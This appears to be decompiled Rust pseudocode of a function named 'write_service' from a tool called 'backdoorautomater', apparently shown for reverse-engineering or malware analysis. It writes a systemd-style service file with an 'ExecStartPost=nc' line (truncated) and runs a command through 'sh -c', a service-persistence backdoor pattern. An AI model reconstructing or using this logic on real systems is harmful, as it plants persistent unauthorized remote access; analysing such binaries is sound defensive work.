
  fn backdoorautomater::modifyservice::write_service::hc4c312686b13b0b4(arg1: *mut i128, arg2: *mut i128, arg3: *mut c_void) -> *mut *mut [i8; 0x94]

{
    let mut var_f8: *const i8 = arg2[1];
    let mut var_108: i128 = *arg2;
    let mut var_f0: i128 = *arg1;
    let var_e0: i64 = arg1[1];
    let mut var_1a0: i128;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_1a0, &var_108, 2, 1, 0);
    let var_190: u64;
    let var_1a8: u64 = var_190;
    let mut var_1b8: i128 = var_1a0;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_108);
    var_108 = &data_566081[0x45];
    *var_108[8] = 0xa;
    var_f8 = var_1b8;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a0, &var_108, 2, 1, 0);
    let var_158: u64 = var_190;
    let mut var_168: i128 = var_1a0;
    std::fs::File::create::he97042899d0016f9(&var_108, &var_1b8);
    let mut result: *mut *mut [i8; 0x94];
    
    if var_108 == 0
    {
        let mut fd: i32 = *var_108[4];
        let mut rax_5: i64;
        let mut rdx: i64;
        rax_5 = _$LT$$RF$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::he83e32c7780ec148(arg3);
        let mut var_1d8: i64 = rax_5;
        let var_1d0_1: i64 = rdx;
        let mut rax_6: *mut c_void = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1d8);
        let mut var_148: i128;
        
        if rax_6 == 0
        {
            'label_455cb2:
            std::process::Command::new::hc59b10cf3f1b2ada(&var_108, 
                "sh-cFailed to execute commandsrc…");
            std::process::Command::arg::h1a6c514e95e1ad22(
                std::process::Command::arg::ha1bca970e684ecbe(&var_108, 
                    "-cFailed to execute commandsrc/m…"), 
                &var_168);
            std::process::Command::output::hf2f7777b705db8a9(&var_1a0);
            core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_148, &var_1a0);
            core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_108);
            let var_128: i64;
            let var_120: size_t;
            alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_1a0, var_128, var_120);
            let mut rax_8: i64;
            let mut rdx_6: u64;
            rax_8 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_1a0);
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                &var_108, rax_8, rdx_6);
            let var_1c8_1: *const i8 = var_f8;
            var_1d8 = var_108;
            core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                &var_1a0);
            backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_1d8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1d8);
            core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_148);
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1b8);
            return nullptr;
        }
        
        loop
        {
            var_108 = *rax_6.byte_offset(8);
            var_f8 = "\n[Install]okExecStartPost=nc Ex…";
            var_f0 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1a0, &var_108, 2, 1, 0);
            let var_138_1: u64 = var_190;
            var_148 = var_1a0;
            let result_1: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_148[8], var_190);
            result = result_1;
            
            if result_1 != 0
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                break;
            }
            
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
            rax_6 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h91a7ac74cc99056e(&var_1d8);
            
            if rax_6 == 0
            {
                goto 'label_455cb2;
            }
        }
    }
    else
    {
        result = *var_108[8];
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1b8);
    result
}
